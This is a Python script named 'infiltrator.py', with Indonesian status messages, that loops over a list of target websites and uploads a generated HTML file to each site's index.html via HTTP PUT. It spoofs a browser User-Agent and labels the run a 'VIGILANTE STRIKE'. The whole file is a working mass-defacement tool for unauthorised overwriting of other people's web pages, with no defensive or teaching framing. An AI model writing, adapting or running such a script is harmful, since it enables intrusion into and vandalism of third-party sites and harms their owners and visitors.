# infiltrator.py
# PROTOCOL: TARGETED PAYLOAD INJECTION
import requests
import os

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

def load_payload():
    payload_path = "output/index.html"
    if os.path.exists(payload_path):
        with open(payload_path, "r", encoding="utf-8") as f:
            return f.read()
    print("[ERROR] output/index.html tidak ditemukan. Jalankan generator.py dahulu.")
    exit()

def main():
    payload = load_payload()
    config_path = "configs/targets.txt"
    
    if not os.path.exists(config_path):
        print(f"[ERROR] Daftar target {config_path} kosong.")
        return

    with open(config_path, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    print("=== INITIATING VIGILANTE STRIKE ===")
    for site in targets:
        target_endpoint = f"{site.strip('/')}/index.html"
        print(f"[!] Menembak target: {target_endpoint}")
        try:
            response = requests.put(target_endpoint, data=payload, headers=HEADERS, timeout=5)
            if response.status_code in [200, 201]:
                print(f"    [SUCCESS] Payload berhasil ditanam!")
            else:
                print(f"    [FAILED] Server merespon dengan kode: {response.status_code}")
        except Exception as e:
            print(f"    [TIMEOUT] Koneksi ditolak oleh WAF/Firewall.")

if __name__ == "__main__":
    main()
